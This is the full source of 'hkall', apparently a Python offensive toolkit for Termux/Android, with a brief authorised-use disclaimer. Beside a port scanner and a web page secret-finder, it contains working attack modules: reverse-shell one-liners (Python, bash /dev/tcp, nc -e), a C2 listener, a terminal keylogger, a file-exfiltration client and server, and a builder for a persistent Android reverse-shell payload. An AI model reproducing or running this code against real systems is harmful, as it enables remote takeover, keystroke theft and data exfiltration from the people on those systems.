#!/usr/bin/env python3
# hkall — modular offensive toolkit for Termux/Android.
# Use only on systems/network you own or have written permission to test.
import socket, threading, os, sys, time, re, select
from datetime import datetime
try:
    import termios, tty
    _TERMIOS = True
except ImportError:
    _TERMIOS = False

VERSION = "0.1.0"
DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA, exist_ok=True)

def banner():
    print(f"hkall v{VERSION} — extend via modules/")
    print("-" * 46)

def hr(t):
    print(f"\n[{t}] " + "-"*40)

# ---------------------------------------------------------------- port scanner
def mod_scan():
    hr("PORT SCANNER")
    host = input("target host: ").strip() or "127.0.0.1"
    ports = input("ports [1-1000]: ").strip() or "1-1000"
    try:
        pl = parse_ranges(ports)
    except ValueError:
        print("invalid range"); return
    if "a" in (x := input("fast mode (all 65535)? [y/N] ").lower()):
        pl = range(1, 65536)
    print(f"scanning {host} ({len(pl)} ports)...")
    open_ports = []
    def probe(port):
        s = socket.socket(); s.settimeout(0.6)
        try:
            s.connect((host, port)); open_ports.append(port)
        except OSError: pass
        finally: s.close()
    threads = 128
    it = iter(pl)
    lock = threading.Lock()
    def worker():
        while True:
            try: port = next(it)
            except StopIteration: return
            probe(port)
            with lock: 
                sys.stdout.write(f"\r  {port} done")
                sys.stdout.flush()
    workers = [threading.Thread(target=worker) for _ in range(threads)]
    for w in workers: w.start()
    for w in workers: w.join()
    print("\nopen ports:", open_ports or "none")

def parse_ranges(s):
    out = []
    for part in s.split(","):
        a,b = part.split("-") if "-" in part else (part,part)
        out += list(range(int(a), int(b)+1))
    return out

# ---------------------------------------------------------------- web enum
def mod_enum():
    hr("WEB ENUMERATOR")
    host = input("target url (http://...): ").strip()
    if not host.startswith("http"): host = "http://" + host
    print("[*] fetching headers...")
    try:
        import urllib.request
        req = urllib.request.Request(host, headers={"User-Agent":"hkall/0.1"})
        with urllib.request.urlopen(req, timeout=8) as r:
            print(f"status {r.status}\n-- headers --")
            for k,v in r.headers.items(): print(f"{k}: {v}")
            body = r.read().decode("utf-8", "ignore")
            print("-- interesting finds --")
            for pat in [r"((?:[A-Za-z0-9._%+-]+)@)", r"(api[./]|token[=:]|secret|passwd|S3|amazonaws|\.db)" ]:
                if isinstance(pat, str):
                    m = re.findall(pat, body, re.I)
                    if m: print("matches:", m[:10])
            for tag in re.findall(r"<(script|iframe|form|meta)\b[^>]*", body, re.I)[:15]:
                print(f"<{tag}>")
    except Exception as e:
        print(f"error: {e}")

# ---------------------------------------------------------------- rev shell C2
LISTENERS = {}
def mod_c2():
    hr("C2 LISTENER")
    port = int(input("listen port: ") or "4444")
    def handle(c):
        c.settimeout(None)
        print(f"[+] shell from {c.getpeername()}, type 'help'")
        while True:
            cmd = input("shell> ")
            if cmd in ("quit","exit"): break
            c.send((cmd+"\n").encode())
            try:
                # crude wait, then one read loop: read until quiet
                time.sleep(0.4)
                c.settimeout(2)
                buf=b""
                while True:
                    try:
                        d=c.recv(4096)
                        if not d: break
                        buf+=d
                        if len(d)<4096: break
                    except socket.timeout: break
                c.settimeout(None)
                sys.stdout.write(buf.decode(errors="replace"))
            except Exception as e:
                print("recv err", e); break
        c.close()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", port)); srv.listen(5)
    print(f"listening on 0.0.0.0:{port} — waiting for reverse shell (ctrl-c to stop)...")
    try:
        while True:
            conn,_ = srv.accept()
            threading.Thread(target=handle, args=(conn,), daemon=True).start()
    except KeyboardInterrupt:
        pass
    srv.close()

def mod_shell():
    hr("SHELL GENERATOR")
    host = input("your reachable IP: ").strip()
    port = input("port: ").strip() or "4444"
    langs = {
      "py": f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
      "bash": f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
      "nc":  f'nc {host} {port} -e /bin/sh',
      "sh":  f'/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1',
    }
    for k,v in langs.items(): print(f"\n--- {k} ---\n{v}")

# ---------------------------------------------------------------- keylogger
KEY_FILE = os.path.join(DATA, "keys.log")
def mod_keylog():
    hr("KEYLOGGER (linux/termux)")
    dur = input("duration sec [0=forever]: ").strip() or "0"
    tk = int(dur) or None
    if not _TERMIOS:
        print("keylogger needs termios (termux has it)"); return
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    tty.setraw(fd)
    start = time.time()
    buf = open(KEY_FILE,"a")
    try:
        while True:
            if tk and time.time()-start > tk: break
            if select.select([sys.stdin],[],[],0.3)[0]:
                ch = sys.stdin.read(1)
                if ch == "\x03": break
                ts = datetime.now().strftime("%H:%M:%S")
                buf.write(f"{ts} {ch!r}\n"); buf.flush()
    except (KeyboardInterrupt, OSError): pass
    finally:
        termios.tcsetattr(fd, termios.TCSANOW, old)
    print(f"saved -> {KEY_FILE}")

# ---------------------------------------------------------------- exfil client
def mod_exfil():
    hr("EXFIL CLIENT")
    server = input("listener ip: ").strip()
    port   = int(input("listener port: ") or "12345")
    fpath  = input("file to send: ").strip()
    if not os.path.isfile(fpath): print("file not found"); return
    size = os.path.getsize(fpath)
    name = os.path.basename(fpath)
    s = socket.socket()
    try:
        s.connect((server, port))
        s.sendall(f"{name}|{size}\n".encode())
        ack = s.recv(1)
        if ack != b"K":
            print("server rejected"); s.close(); return
        with open(fpath,"rb") as f:
            while chunk := f.read(65536):
                s.sendall(chunk)
        s.close()
        print(f"sent {name} ({size} bytes)")
    except OSError as e:
        print(f"error: {e}")

def mod_recv():
    hr("EXFIL SERVER (receive)")
    port = int(input("listen port: ") or "12345")
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    srv.bind(("",port)); srv.listen(1)
    print(f"listening 0.0.0.0:{port}...")
    c,_ = srv.accept()
    meta = b""
    while b"\n" not in meta: meta += c.recv(1)
    name,size = meta.decode().strip().split("|")
    size = int(size)
    c.send(b"K")
    dest = os.path.join(DATA, name)
    got=0
    with open(dest,"wb") as f:
        while got < size:
            d = c.recv(65536)
            if not d: break
            f.write(d); got += len(d)
    c.close(); srv.close()
    print(f"received {dest} ({got}/{size} bytes)")

# ---------------------------------------------------------------- payload builder
def mod_payload():
    hr("PAYLOAD BUILDER (android reverse https)")
    host = input("c2 host: ").strip()
    port = input("c2 port: ").strip() or "8443"
    out = os.path.join(DATA, "payload.py")
    p = f'''#!/usr/bin/env python3
# generated by hkall — change HOST/PORT before use
import socket,subprocess,os,threading,time
HOST,PORT="{host}",{port}
while True:
    try:
        s=socket.socket();s.connect((HOST,int(PORT)))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/system/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
        s.close()
    except Exception: pass
    time.sleep(5)
'''
    with open(out,"w") as f: f.write(p)
    print(f"wrote {out}")

# ---------------------------------------------------------------- menu
MENU = [
    ("1", "Port scanner", mod_scan),
    ("2", "Web enumerator", mod_enum),
    ("3", "Reverse shell generator", mod_shell),
    ("4", "C2 listener (interactive shell)", mod_c2),
    ("5", "Keylogger (linux)", mod_keylog),
    ("6", "Exfil client (send file)", mod_exfil),
    ("7", "Exfil server (receive file)", mod_recv),
    ("8", "Android payload builder", mod_payload),
]

def main():
    banner()
    while True:
        print("\nmodules:")
        for k,t,_ in MENU: print(f"  [{k}] {t}")
        print("  [0] exit")
        try:
            c = input("hkall> ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if c == "0": break
        for k,t,f in MENU:
            if c == k:
                try: f()
                except KeyboardInterrupt: pass
                break
        else:
            print("unknown option")

if __name__ == "__main__":
    main()
